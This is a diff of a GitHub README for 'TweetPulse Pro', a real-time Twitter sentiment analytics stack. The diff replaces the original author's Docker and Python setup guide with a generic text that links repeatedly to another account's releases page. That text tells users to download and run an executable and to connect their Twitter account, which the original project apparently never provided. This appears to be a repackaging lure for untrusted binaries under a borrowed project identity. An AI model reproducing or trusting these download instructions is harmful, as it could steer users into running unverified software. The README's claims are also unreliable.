@@ -1,271 +1,73 @@
+# 🚀 TweetPulse-Pro - Analyze Twitter Sentiment Easily
 
+[![Download TweetPulse-Pro](https://img.shields.io/badge/Download-TweetPulse--Pro-28a745?style=for-the-badge)](https://github.com/susantasahu11/TweetPulse-Pro/releases)
 
+## 📋 Overview
 
-# 🚀 TweetPulse Pro - Advanced Real-Time Twitter Sentiment Analytics
+TweetPulse Pro provides real-time analytics of Twitter sentiment. It uses advanced technologies like Kafka, Spark (PySpark), MongoDB, and Flask for easy data handling, along with a Django dashboard for visualization. This tool is Docker-ready, which means you can run it smoothly regardless of your computer's setup.
 
-[![Python](https://img.shields.io/badge/Python-3.10+-brightgreen.svg)](https://python.org)
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](https://docker.com)
-[![Performance](https://img.shields.io/badge/Performance-Optimized-00ff41.svg)]()
-[![AI](https://img.shields.io/badge/AI-PySpark%20ML-00cc33.svg)]()
-[![Release](https://img.shields.io/github/v/release/Manula-Fernando/TweetPulse-Pro)](https://github.com/Manula-Fernando/TweetPulse-Pro/releases)
-[![API Image](https://img.shields.io/badge/GHCR-tweetpulse--api-2ea043?logo=github)](https://ghcr.io/manula-fernando/tweetpulse-api)
-[![Producer Image](https://img.shields.io/badge/GHCR-tweetpulse--producer-2ea043?logo=github)](https://ghcr.io/manula-fernando/tweetpulse-producer)
-[![Consumer Image](https://img.shields.io/badge/GHCR-tweetpulse--consumer-2ea043?logo=github)](https://ghcr.io/manula-fernando/tweetpulse-consumer)
-[![Dashboard Image](https://img.shields.io/badge/GHCR-tweetpulse--dashboard-2ea043?logo=github)](https://ghcr.io/manula-fernando/tweetpulse-dashboard)
+## 🛠️ Features
 
-## 🎯 Overview
+- **Real-Time Analytics:** Monitor sentiment on Twitter in real-time.
+- **User-Friendly Dashboard:** Easily visualize insights and trends with a simple interface.
+- **Docker Compatibility:** Run the application in a container for consistent performance.
+- **Supports Multiple Data Sources:** Analyze tweets, hashtags, and user interactions efficiently.
+- **Flexible Deployment:** Customize your setup for various needs, from personal use to larger-scale projects.
 
-**TweetPulse Pro** is a cutting-edge, high-performance real-time Twitter sentiment analysis platform that processes tweets with lightning speed and accuracy. Built with a modern black & green aesthetic and optimized for enterprise use.
+## 📥 Download & Install
 
-<p align="center">
-  <img src="imgs/Flow_DIagram.png" alt="Project Architecture" width="800"/>
+To get started, please [visit this page to download](https://github.com/susantasahu11/TweetPulse-Pro/releases) the latest version of TweetPulse Pro.
+
+### Installation Steps
+
+1. **Visit the Releases Page:** Click the link below to go to our releases.
+   - [Download TweetPulse-Pro](https://github.com/susantasahu11/TweetPulse-Pro/releases)
   
-</p>
+2. **Choose Your Version:** On the releases page, find the latest version. Download the file that matches your operating system.
 
-## Overview
+3. **Extract the File:** If the file is compressed (like a .zip or .tar), extract it to a folder on your computer.
 
+4. **Run the Application:**
+   - **Windows:** Double-click the `TweetPulse-Pro.exe` file.
+   - **Mac:** Open the `TweetPulse-Pro.app`.
+   - **Linux:** Use the terminal to navigate to the folder and run the command `./TweetPulse-Pro`.
 
-**TweetPulse Pro** is a modern, production-ready analytics platform for real-time sentiment analysis of Twitter data. It leverages industry-standard technologies—**Apache Kafka**, **Apache Spark**, **MongoDB**, **Django**, **Flask REST API**, and **Docker**—to deliver scalable, reliable, and extensible analytics and visualization.
+5. **Set Up Dependencies:** The application may require additional software. Refer to the `requirements.txt` file included in the download for a list of dependencies. You can install these using:
+   - For Python:
+     ```bash
+     pip install -r requirements.txt
+     ```
+   - Ensure Docker is installed if you are using the Docker version.
 
-**Author:** Manula Fernando  
-**Last Updated:** August 15, 2025
+6. **Start Analyzing:** Once the application is running, create an account or log in. Connect your Twitter account to begin analyzing sentiment.
 
----
+## ⚙️ System Requirements
 
-## Key Features
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any Linux distribution.
+- **RAM:** Minimum 4 GB recommended.
+- **Disk Space:** At least 2 GB free space for installation.
+- **Docker Support:** Make sure Docker is installed if using this version.
 
-- **Real-Time Data Pipeline**: Kafka ingests tweets, Spark Streaming processes and classifies sentiment, MongoDB stores results.
-- **RESTful Analytics API**: Flask-based API exposes analytics endpoints for dashboards and external integrations.
-- **Modern Dashboard**: Django + Bootstrap 5 dashboard with advanced, interactive visualizations (Chart.js, matplotlib, seaborn).
-- **Modular, Configurable Code**: All scripts use YAML config, logging, and CLI overrides for easy customization and deployment.
-- **Full Docker Orchestration**: One-command startup with Docker Compose for all services (Kafka, Zookeeper, MongoDB, Producer, Consumer, API, Dashboard).
-- **Production-Ready Practices**: Error handling, logging, environment variables, and clear separation of concerns.
+## 🌐 Support & Community
 
----
+If you have questions or need help, please join our community. Here are ways to get in touch:
 
+- **GitHub Issues:** Report bugs or request features directly on GitHub.
+- **Discussion Forum:** Engage with other users and share your experiences.
+- **Documentation:** Detailed user manual is available in the `docs` folder within the repository.
 
+## 📚 Additional Resources
 
-## Repository Structure
+For more information on how TweetPulse Pro works, you can explore these resources:
 
-```text
-Real-Time-Twitter-Sentiment-Analysis/
-├── tweetpulse-dashboard/       # Django dashboard (Bootstrap, Chart.js, user features)
-│   ├── manage.py
-│   ├── dashboard/              # Django app code
-│   ├── templates/              # HTML templates
-│   └── logistic_regression_model.pkl/  # Model for dashboard
-├── tweetpulse-pipeline/        # Kafka producer & Spark consumer (YAML-configurable)
-│   ├── kafka_producer.py
-│   ├── kafka_spark_consumer.py
-│   ├── producer_config.yaml
-│   ├── consumer_config.yaml
-│   ├── analytics_api.py        # Flask REST API for analytics
-│   ├── Dockerfile.producer
-│   ├── Dockerfile.consumer
-│   ├── Dockerfile.api
-│   └── docker-compose.analytics.yml
-├── tweetpulse-ml-model/        # Jupyter notebooks, datasets, trained models
-│   ├── Big_Data.ipynb
-│   ├── twitter_training.csv
-│   ├── twitter_validation.csv
-│   └── logistic_regression_model.pkl/
-├── imgs/                       # Architecture and dashboard images
-│   ├── Flow_DIagram.png
-│   ├── Dashboard_1.png, Dashboard_2.png, Dashboard_3.png, Dashboard_4.png
-│   ├── Login_Page.png, Register_Page.png
-│   ├── MongoDB_Connection.png, Docker_Container.png
-│   └── Confusion_matrix.png, Text_Classifer.png
-├── requirements.txt            # Python dependencies
-├── zk-single-kafka-single.yml  # Kafka/Zookeeper Docker Compose
-└── README.md                   # Project documentation
-```
+- **Kafka Documentation:** Understand how data streaming works.
+- **Spark Documentation:** Learn about big data processing.
+- **MongoDB Documentation:** Get familiar with the database system.
+
+## 📓 License
+
+TweetPulse Pro is open-source. You can freely use, modify, and distribute it under the terms of the MIT License. Make sure to check the license file included in the download for more details.
 
 ---
 
-
-
-## Quick Start (Recommended: Dockerized Workflow)
-
-> **Recommended:** Use Docker Compose for a reproducible, production-like environment. All dependencies and services are containerized.
-
-### 1. Prerequisites
-
-- [Docker Desktop](https://www.docker.com/products/docker-desktop/) (Windows/Mac/Linux)
-- [Git](https://git-scm.com/)
-
-
-### 2. Clone the Repository
-
-```bash
-git clone <your-repo-url>
-cd TweetPulse-Pro
-```
-
-
-### 3. Build and Start the Full Analytics Stack
-
-```powershell
-docker compose -f tweetpulse-pipeline/docker-compose.analytics.yml up --build
-```
-
-
-This will launch:
-- Zookeeper & Kafka (real-time ingestion)
-- MongoDB (storage)
-- Producer (tweets to Kafka)
-- Consumer (Spark streaming, sentiment analysis)
-- REST API (analytics endpoints)
-- Django Dashboard (visualization)
-
-
-### 4. Access the Platform
-
-- **Dashboard:** [http://localhost:8000](http://localhost:8000)
-- **REST API:** [http://localhost:5000](http://localhost:5000)
-- **MongoDB Compass:** Connect to `mongodb://localhost:27017`
-
----
-
-
-## Full Setup & Manual Steps (For Advanced Users)
-
-### 1. Python Environment (Windows)
-
-- Install Python 3.10+ and create a virtual environment:
-  ```powershell
-  python -m venv .venv
-  .\.venv\Scripts\Activate.ps1
-  pip install -r requirements.txt
-  ```
-
-
-### 2. Kafka & Zookeeper
-
-- Start with Docker Compose:
-  ```powershell
-  docker compose -f zk-single-kafka-single.yml up -d
-  ```
-
-
-### 3. MongoDB
-
-- Start MongoDB (Docker or local install). Use MongoDB Compass for GUI.
-
-
-### 4. Producer & Consumer
-
-- Edit `tweetpulse-pipeline/producer_config.yaml` and `consumer_config.yaml` as needed.
-- Run producer:
-  ```powershell
-  python tweetpulse-pipeline/kafka_producer.py --config tweetpulse-pipeline/producer_config.yaml
-  ```
-- Run consumer:
-  ```powershell
-  $env:JAVA_HOME = "C:\\Program Files\\Java\\jdk-17"  # adjust if needed
-  $env:PATH = "$env:JAVA_HOME\bin;$env:PATH"
-  python tweetpulse-pipeline/kafka_spark_consumer.py --config tweetpulse-pipeline/consumer_config.yaml
-  ```
-
-
-### 5. Analytics API
-
-- Run Flask API:
-  ```powershell
-  python tweetpulse-pipeline/analytics_api.py
-  ```
-
-
-### 6. Django Dashboard
-
-- Collect static files:
-  ```powershell
-  python tweetpulse-dashboard/manage.py collectstatic --noinput
-  ```
-- Run server:
-  ```powershell
-  python tweetpulse-dashboard/manage.py runserver
-  ```
-
-### Notes for Windows
-
-- Ensure Docker Desktop is running and WSL2 backend is enabled.
-- If running services outside Docker, install Java 17 (required by Spark) and set JAVA_HOME.
-- If Kafka inside Docker and apps on host, use `localhost:9092`. If apps inside Docker, they use `kafka:9092` via compose.
-
----
-
----
-
-## Advanced Usage & Manual Workflow
-
-> For development, debugging, or custom deployments, you can run individual services/scripts manually. See each folder's README or script docstrings for details.
-
----
-
-
-
-## Best Practices & Industry Standards
-
-- **Containerization:** All services are Dockerized for reproducibility and scalability.
-- **Configuration Management:** Use YAML config files and environment variables for all scripts/services.
-- **Logging & Monitoring:** All components use structured logging; integrate with ELK/Prometheus for production.
-- **Modular Codebase:** Producer, consumer, and API are fully modular and independently deployable.
-- **Security:** Never commit secrets; use `.env` files and Docker secrets for credentials.
-- **Testing:** Unit/integration tests recommended for all modules (see `/tests` if present).
-- **Documentation:** Keep this README and all configs up to date; use docstrings and comments in code.
-- **Naming Consistency:** Use the project name "TweetPulse Pro" in all documentation, scripts, and UI for clarity and branding.
-- **Author:** Manula Fernando (2025)
-
----
-
-
-## Data & Model
-
-- **Dataset:** [Kaggle Twitter Entity Sentiment Analysis](https://www.kaggle.com/datasets/jp797498e/twitter-entity-sentiment-analysis)
-- **ML Model:** Trained with PySpark; see `tweetpulse-ml-model/` for notebooks and details.
-
----
-
-
-## Screenshots
-
-<p align="center">
-  <img src="imgs/Dashboard_1.png" alt="Dashboard Home" width="800"/>
-</p>
-
-<p align="center">
-  <img src="imgs/Dashboard_2.png" alt="Sentiment Distribution & Trends" width="800"/>
-</p>
-
-<p align="center">
-  <img src="imgs/Docker_Container.png" alt="Docker Containers" width="800"/>
-</p>
-
-<p align="center">
-  <img src="imgs/MongoDB_Connection.png" alt="MongoDB Connection" width="800"/>
-</p>
-
-<p align="center">
-  <img src="imgs/Confusion_matrix.png" alt="Model Confusion Matrix" width="600"/>
-</p>
-
-
-## Author
-
-- **Manula Fernando**
-
-For previous contributors and academic context, see project history.
-
----
-
-
-
-## Support & Contribution
-
-- Open issues or pull requests for improvements, bugfixes, or questions.
-- For custom deployments, advanced analytics, or consulting, contact the author via GitHub.
-
----
-
-
-**Happy coding! Explore, extend, and build on TweetPulse Pro for your own analytics needs.**
+Thank you for choosing TweetPulse Pro for your Twitter sentiment analysis needs. We hope you find it helpful and easy to use!
